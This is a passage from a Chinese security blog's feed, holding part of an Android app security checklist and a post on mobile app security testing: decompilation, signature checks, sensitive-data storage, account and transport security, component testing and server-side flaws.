被劫持，将存在信息泄露或被篡改风险</li></ul></li><li><p>广播或意图伪造</p><ul><li>具体分析 具体分析 调研</li><li>静态分析应用结合动态跟踪，检查是否可以通过伪造广播消息触发应用的特定流程。</li><li>广播伪造可让应用执行特定流程，进一步实现伪造用户请求、拒绝服务、本地权限提升等。</li></ul></li><li><p>广播或意图劫持</p><ul><li>具体分析 具体分析 yes</li><li>静态分析应用结合动态跟踪，检查是否存在将敏感信息发送至广播中。</li><li>广播劫持可截取应用程序的广播消息，获取参数中的敏感信息。</li></ul></li><li><p>Zip 路径穿越</p><ul><li>高 具体分析 调研</li><li>静态分析应用，检查是否正确处理 Zip 解压。</li><li>利用精心构造的 Zip 文件，可以跨路径覆盖应用的私有数据， 进而实现任意代码执行等。</li><li>需要能找到执行路径</li></ul></li><li><p>客户端XSS</p><ul><li>高 具体分析 调研</li><li>静态分析和模糊测试，检查客户端渲染 HTML 界面时是否能插入恶意代码。</li><li>利用精心构造的输入，在客户端 HTML 界面中植入特定逻辑，进一步实现获取用户凭据等。</li></ul></li><li><p>密码学实现问题</p><ul><li>具体分析 具体分析 部分</li><li>静态分析应用程序逻辑和动态跟踪结合，逆向密码学相关函数调用，检查是否存在错误的密码学实现，如硬编码的对称加密密钥或强度不足的单向散利函数。</li><li>错误的密码学功能实现将导致加密强度显著降低，结合其他问题进一步攻击应用程序。</li></ul></li><li><p>不安全的用户认证</p><ul><li>高 具体分析 no</li><li>静态分析应用程序逻辑和动态跟踪结合，逆向用户认证过程，检查是否存在逻辑和实现漏洞。</li><li>不安全的用户认证可能导致用户身份被冒用、撞库攻击等，危害帐号安全。</li></ul></li><li><p>内网 IP 泄漏</p><ul><li>中 低 yes</li><li>静态分析应用程序的代码中是否包含了硬编码的服务端私有地址。</li><li>攻击者可使用得到的地址，结合其他服务端应用对内网发起 SSRF 等类型的攻击。</li></ul></li><li><p>错误页面泄露隐私信息</p><ul><li>具体分析 低 no</li><li>检查应用异常状态下错误信息是否包含敏感信息。</li><li>客户端或服务端的异常信息中如果包含敏感数据则易导致信息泄露或者为攻击者提供额外信息</li></ul></li><li><p>客户端路径穿越</p><ul><li>高 具体分析 调研</li><li>静态分析应用程序逻辑，以及动态跟踪程序执行。</li><li>攻击者可使用路径穿越问题访问应用的私有数据。</li><li>需要找到可执行路径</li></ul></li><li><p>第三方代码问题</p><ul><li>具体分析 具体分析 调研</li><li>检测第三方 SDK 和程序引用及其版本，检查是否存在已知安全漏洞、后门甚至恶意代码。</li><li>程序通过 SDK 等方式引入的第三方代码，如包含后门、漏洞等，将直接影响到应用本身的安全，且难以自行修复。</li></ul></li><li><p>敏感内容输出到日志</p><ul><li>具体分析 低 调研</li><li>使用静态分析和动态运行相结合，检查应用是否将敏感信息输出到日志中。</li><li>攻击者可读取系统日志跨应用获取信息。</li></ul></li><li><p>未启用键盘记录保护</p><ul><li>中 低 调研</li><li>静态分析应用可执行文件，结合动态跟踪，根据应用安全性要求判断是否需要对特定输入控件添加自定义软键盘。</li><li>系统键盘可能导致第三方应用读取键盘缓存获取用户名，或使用屏幕录制截取用户输入。</li></ul></li><li><p>敏感应用未进行root检测</p><ul><li>低 低 yes</li><li>静态分析应用逻辑结合设备实机安装，判断应用是否根据自身需求对环境进行检测，以及告知用户 root 后的潜在的风险。</li><li>在已 root 设备上将极大增加 App 的攻击面，恶意软件可以使用非公开 API、Hook 等技术绕过应用沙盒，获取用户 token、登录凭据等敏感信息。</li></ul></li><li><p>访问控制不当</p><ul><li>高 低 no</li><li>静态分析应用可执行文件，结合动态跟踪，分析应用访问控制模型是否符合安全性要求。</li><li>错误的访问控制策略可能导致用户敏感信息遭到泄露。</li></ul></li><li><p>逻辑缺陷</p><ul><li>具体分析 具体分析 no</li><li>静态分析应用可执行文件，结合动态跟踪，分析应用是否存在可以被攻击利用的逻辑错误。</li><li>逻辑错误将导致应用出现非设计预期的行为。</li></ul></li><li><p>native代码可被调试</p><ul><li>中 具体分析 no</li><li>动态分析应用native部分程序是否使用反调试技巧防止代码被动态调试。</li><li>native代码可以被调试将降低对应用逆向工程的成本。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      本文中列出了安卓应用中需要关注的安全项目清单。
    
    </summary>
    
      <category term="Security" scheme="https://www.diyz.bid/categories/Security/"/>
    
    
      <category term="安全文档" scheme="https://www.diyz.bid/tags/%E5%AE%89%E5%85%A8%E6%96%87%E6%A1%A3/"/>
    
      <category term="SDL" scheme="https://www.diyz.bid/tags/SDL/"/>
    
      <category term="Checklist" scheme="https://www.diyz.bid/tags/Checklist/"/>
    
      <category term="Android" scheme="https://www.diyz.bid/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>APP安全测试</title>
    <link href="https://www.diyz.bid/Security/APP%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    <id>https://www.diyz.bid/Security/APP安全测试/</id>
    <published>2018-08-23T07:24:09.000Z</published>
    <updated>2018-10-11T10:12:52.864Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、安装包测试"><a href="#一、安装包测试" class="headerlink" title="一、安装包测试"></a>一、安装包测试</h2><h3 id="1-1-关于反编译"><a href="#1-1-关于反编译" class="headerlink" title="1.1 关于反编译"></a>1.1 关于反编译</h3><p>　　目的是为了保护公司的知识产权和安全方面的考虑等，一些程序开发人员会在源码中硬编码一些敏感信息，如密码。而且若程序内部一些设计欠佳的逻辑，也可能隐含漏洞，一旦源码泄漏，安全隐患巨大。<br>　　为了避免这些问题，除了代码审核外，通常开发的做法是对代码进行混淆，混淆后源代码通过反软件生成的源代码是很难读懂的，测试中，我们可以直接使用反编译工具（dex2jar和jd-gui工具）查看源代码，判断是否进行了代码混淆，包括显而易见的敏感信息。</p><h3 id="1-2-关于签名"><a href="#1-2-关于签名" class="headerlink" title="1.2 关于签名"></a>1.2 关于签名</h3><p>　　这点IOS可以不用考虑，因为APP stroe都会校验。但Android没有此类权威检查，我们要在发布前校验一下签名使用的key是否正确，以防被恶意第三方应用覆盖安装等。可使用下列命令检查：<br><code>jarsigner -verify -verbose -certs apk包路径</code><br>　　若结果为“jar 已验证”，说明签名校验成功。</p><h3 id="1-3-完整性校验"><a href="#1-3-完整性校验" class="headerlink" title="1.3 完整性校验"></a>1.3 完整性校验</h3><p>　　为确保安装包不会在测试完成到最终交付过程中因为知足者趾问题发生文件损坏，需要对安装包进行完整性校验，通常做法是检查文件的md5值，而且一般可以通过自动化做校验。</p><h3 id="1-4-权限设置检查"><a href="#1-4-权限设置检查" class="headerlink" title="1.4 权限设置检查"></a>1.4 权限设置检查</h3><p>　　一般用户对自己的隐私问题十 分敏感，因此，我们需要对APP申请某些特定权限的必要性进行检查，如访问通讯录等。对于没有必要的权限，一般都建议开发 直接支除。</p><ul><li><strong>Android</strong>：直接检查manifest文件来读取应用所需要的全部权限，并结合需求进行校验此权限是否为必须的。manifest文件的修改也需要关注，在增加新权限前需要进行评估。</li><li><strong>IOS</strong>：没有类似manifest文件来查看，IOS的用户权限只有在用户使用APP到了需要使用的权限时，系统才会弹出提示框，提示用户当前APP需要访问照片、联系人列表等组件。我们可以扫描代码来查看项目工程中有哪些权限设置。通过搜索关键类名，如通讯录一般需要访问ABAddressBookRef，照片是UIImagePickerController等。如果是纯黑盒测试，则必须覆盖到所有代码路径才能保证没有遗漏，也可使用代码覆盖率测试判断是否覆盖。</li></ul><h2 id="二、敏感信息测试"><a href="#二、敏感信息测试" class="headerlink" title="二、敏感信息测试"></a>二、敏感信息测试</h2><p>　　数据库是否存储敏感信息，某些应用会把cookie类数据保存在数据库中，一旦此数据被他人获取，可能造成用户账户被盗用等严重问题，测试中在跑完一个包含数据库操作的测试用例后，我们可以直接查看数据库里的数据，观察是否有敏感信息存储在内。一般来说这些敏感信息需要用户进行注销操作后删除。如果是cookie类数据，建议设置合理的过期时间。<br>　　日志是否存在敏感信息，一般开发在写程序的过程中会加入日志帮助高度，所有可能会写入一些敏感信息，通常APP的发布版不会使用日志，但也不排除特殊情况。<br>　　配置文件是否存在敏感信息，与日志类似，我们需要检查配置文件中是否包含敏感信息。</p><h2 id="三、软键盘劫持"><a href="#三、软键盘劫持" class="headerlink" title="三、软键盘劫持"></a>三、软键盘劫持</h2><p>　　如果用户安装了第三方键盘，可能存在劫持情况，对此，我们在一些特别敏感的输入地方可以做检查，例如金融类APP登录界面的用户名密码输入框等，看是否支持第三方输入法，一般建议使用应用内的软键盘。</p><h2 id="四、账户安全"><a href="#四、账户安全" class="headerlink" title="四、账户安全"></a>四、账户安全</h2><ul><li>密码是否明文存储在后台数据库，在评审和测试中需要关注密码的存储。</li><li>密码传输是否加密，测试中我们需要查看密码是否被 明文传输，如果是HTTP接口，我们可以使用FIddler等工具直接查看。</li><li>账户锁定策略。对于 用户输入错误密码次数过多的情况，是否会将账户临时锁定，避免被暴力破解，</li><li>同时会话情况。一些应用对同时会话会有通知功能，这样至少可以让用户知识他的账户可能已经被泄漏了。在一定程度上能免提升用户体验。</li><li>注销机制。在客户端注销后，我们需要验证任何的来自该用户的，需要身份验证的接口调用都不能成功。</li></ul><h2 id="五、数据通信安全"><a href="#五、数据通信安全" class="headerlink" title="五、数据通信安全"></a>五、数据通信安全</h2><ul><li>关键数据是否散列或加密。密码在传输中必须是加密的，其他敏感信息传输前也需要进行散列或者加加密，以免被中间节点获取并恶意利用。</li><li>关键连接是否使用安全通信，例如HTTPS。在获知接口设计后我们需要评估是否其中内容包含敏感信息，如果未使用安全通信，需要知会开发修改。</li><li>是否对数字证书合法性进行验证。即便使用了安全通信，例如HTTPS，我们也需要在客户端代码中对服务端证书进行合法性校验。测试中可以使用Fiddler工具模拟中间人攻击方法。如果客户端对于Fiddler证书没有校验而能正常调用，则存在安全隐患。</li><li>是否校验数据合法性。在一些情况下，我们需要有方法来确保服务端下发的明文数据不被篡改。通常开发侧的实现方式是对数据进行数字签名并在客户端进行校验。我们可以模拟后台返回进行相关的测试工作。此外，对于其他一些客户端未进行数据校验的接口，我们也需要有意识地思考如果不进行校验是否会产生问题，并通过模拟后台返回验证。</li></ul><h2 id="六、组件安全测试"><a href="#六、组件安全测试" class="headerlink" title="六、组件安全测试"></a>六、组件安全测试</h2><p>　　这里主要是指Android平台各个组件是否能被 外部应用恶意调用从而带来一些安全问题。包括Activity、Service、ContentProvider、Broadcast等等。采用的测试方法是通过使用drozer工具结合查看代码的方式，具体使用方法可查看官方文档。</p><h2 id="七、服务端接口测试"><a href="#七、服务端接口测试" class="headerlink" title="七、服务端接口测试"></a>七、服务端接口测试</h2><p>　　主要关注服务端接口是否存在以下问题</p><ul><li>SQL注入</li><li>XSS跨站脚本攻击</li><li>CSRF跨站请求伪造</li><li>越权访问</li></ul><p>　　除了上述服务端问题外，我们还需要结合实际的需求，设计和代码，分析是否需求或设计本身就会带来安全问题。</p><h2 id="八、附录"><a href="#八、附录" class="headerlink" title="八、附录"></a>八、附录</h2><ul><li>软件权限</li></ul><ol><li>扣费风险：包括短信、拨打电话、连接网络等。</li><li>隐私泄露风险：包括访问手机信息、访问联系人信息等。</li><li>对App的输入有效性校验、认证、授权、数据加密等方面进行检测</li><li>限制/允许使用手机功能接入互联网</li><li>限制/允许使用手机发送接收信息功能</li><li>限制或使用本地连接</li><li>限制/允许使用手机拍照或录音</li><li>限制/允许使用手机读取用户数据</li><li>限制/允许使用手机写入用户数据</li><li>限制/允许应用程序来注册自动启动应用程序</li></ol><ul><li>数据安全性</li></ul><ol><li>当将密码或其它的敏感数据输入到应用程序时，其不会被存储在设备中，同时密码也不会被解码。</li><li>输入的密码将不以明文形式进行显示。</li><li>密码、信用卡明细或其他的敏感数据将不被存储在它们预输入的位置上。</li><li>不同的应用程序的个人身份证或密码长度必须至少在4-8个数字长度之间。</li><li>当应用程序处理信用卡明细或其它的敏感数据时，不以明文形式将数据写到其他单独的文件或者临时文件中。以防止应用程序异常终止而又没有删除它的临时文件，文件可能遭受入侵者的袭击，然后读取这些数据信息。</li><li>党建敏感数据输入到应用程序时，其不会被存储在设备中。</li><li>应用程序应考虑或者虚拟机器产生的用户提示信息或安全警告</li><li>应用程序不能忽略系统或者虚拟机器产生的用户提示信息或安全警告，更不能在安全警告显示前，利用显示误导信息欺骗用户，应用程序不应该模拟进行安全警告误导用户。</li><li>在数据删除之前，应用程序应当通知用户或者应用程序提供一个“取消”命令的操作。</li><li>应用程序应当能够处理当不允许应用软件连接到个人信息管理的情况。</li><li>当进行读或写用户信息操作时，应用程序将会向用户发送一个操作错误的提示信息。</li><li>在没有用户明确许可的前提下不损坏删除个人信息管理应用程序中的任何内容。</li><li>如果数据库中重要的数据正要被重写，应及时告知用户。</li><li>能合理的处理出现的错误。</li><li>意外情况下应提示用户。</li></ol><ul><li>通讯安全性</li></ul><ol><li>在运行软件过程中，如果有来电、SMS、蓝牙等通讯或充电时，是否能暂停程序，优先处理通信，并在处理完毕后能正常恢复软件，继续其原来的功能。</li><li>当创立连接时，应用程序能够处理因为网络连接中断，进而告诉用户连接中断的情况。</li><li>应能处理通讯延时或中断。</li><li>应用程序将保持工作到通讯超时，进而给用户一个错误信息指示有链接错误。</li><li>应能处理网络异常和及时将异常情况通报用户。</li><li>应用程序关闭网络连接不再使用时应及时关闭，断开。</li></ol><ul><li>人机接口安全测试</li></ul><ol><li>返回菜单应总保持可用。</li><li>命令有优先权顺序。</li><li>声音的设置不影响使用程序的功能。</li><li>应用程序必须能够处理不可预知的用户操作，例如错误的操作和同时按下多个键。</li></ol>]]></content>
    
    <summary type="html">
    
      本文列出了在进行APP测试时需要关注的一些问题。
    
    </summary>
    
      <category term="Security" scheme="https://www.diyz.bid/categories/Security/"/>
    
    
      <category term="安全文档" scheme="https://www.diyz.bid/tags/%E5%AE%89%E5%85%A8%E6%96%87%E6%A1%A3/"/>
    
      <category term="SDL" scheme="https://www.diyz.bid/tags/SDL/"/>
    
  </entry>
  
</feed>
